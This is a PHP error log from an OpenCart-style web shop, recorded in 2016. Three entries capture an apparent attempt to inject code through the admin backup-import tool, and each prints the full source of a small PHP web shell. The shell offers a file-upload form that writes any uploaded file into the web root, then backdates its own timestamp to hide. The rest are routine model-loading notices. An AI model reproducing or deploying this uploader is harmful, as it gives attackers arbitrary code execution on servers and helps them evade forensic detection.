2016-02-11 15:37:51 - PHP Notice:  Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=wind' at line 1<br />Error No: 1064<br /><html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8"> 
<title>utf</title> 
</head> 
<body> 
<?php 
echo "<h1>Welcome</h1>\n"; 
echo "IP: "; 
echo $_SERVER['REMOTE_ADDR']; 
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n"; 
echo "<input type=\"file\" name=\"newfile\"><br> \n"; 
echo "<input type=\"submit\" value=\"OK\"><br>\n"; 
echo "</form>\n"; 
if(is_uploaded_file($_FILES["newfile"]["tmp_name"])) 
    { 
    move_uploaded_file($_FILES["newfile"]["tmp_name"], $_FILES["newfile"]["name"]); 
    $file = $_FILES["newfile"]["name"]; 
    echo "<a href=\"$file\">$file</a>"; 
    } else { 
    echo("empty"); 
    } 
$newfile = $_SERVER[SCRIPT_FILENAME]; 
$time = time() - 105360688; 
touch($newfile, $time); 
?> 
</body> 
</html> in /home2/goldglas/public_html/system/database/mysql.php on line 50
2016-02-11 16:32:04 - PHP Notice:  Undefined index: import in /home2/goldglas/public_html/admin/controller/tool/backup.php on line 13
2016-02-11 16:32:08 - PHP Notice:  Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=wind' at line 1<br />Error No: 1064<br /><html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8"> 
<title>utf</title> 
</head> 
<body> 
<?php 
echo "<h1>Welcome</h1>\n"; 
echo "IP: "; 
echo $_SERVER['REMOTE_ADDR']; 
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n"; 
echo "<input type=\"file\" name=\"newfile\"><br> \n"; 
echo "<input type=\"submit\" value=\"OK\"><br>\n"; 
echo "</form>\n"; 
if(is_uploaded_file($_FILES["newfile"]["tmp_name"])) 
    { 
    move_uploaded_file($_FILES["newfile"]["tmp_name"], $_FILES["newfile"]["name"]); 
    $file = $_FILES["newfile"]["name"]; 
    echo "<a href=\"$file\">$file</a>"; 
    } else { 
    echo("empty"); 
    } 
$newfile = $_SERVER[SCRIPT_FILENAME]; 
$time = time() - 105360688; 
touch($newfile, $time); 
?> 
</body> 
</html> in /home2/goldglas/public_html/system/database/mysql.php on line 50
2016-02-12 12:42:41 - PHP Notice:  Undefined index: import in /home2/goldglas/public_html/admin/controller/tool/backup.php on line 13
2016-02-12 12:42:43 - PHP Notice:  Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=wind' at line 1<br />Error No: 1064<br /><html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8"> 
<title>utf</title> 
</head> 
<body> 
<?php 
echo "<h1>Welcome</h1>\n"; 
echo "IP: "; 
echo $_SERVER['REMOTE_ADDR']; 
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n"; 
echo "<input type=\"file\" name=\"newfile\"><br> \n"; 
echo "<input type=\"submit\" value=\"OK\"><br>\n"; 
echo "</form>\n"; 
if(is_uploaded_file($_FILES["newfile"]["tmp_name"])) 
    { 
    move_uploaded_file($_FILES["newfile"]["tmp_name"], $_FILES["newfile"]["name"]); 
    $file = $_FILES["newfile"]["name"]; 
    echo "<a href=\"$file\">$file</a>"; 
    } else { 
    echo("empty"); 
    } 
$newfile = $_SERVER[SCRIPT_FILENAME]; 
$time = time() - 105360688; 
touch($newfile, $time); 
?> 
</body> 
</html> in /home2/goldglas/public_html/system/database/mysql.php on line 50
2016-05-03 12:14:25 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-03 12:57:07 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-03 13:13:35 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-03 13:14:51 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-03 14:43:36 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
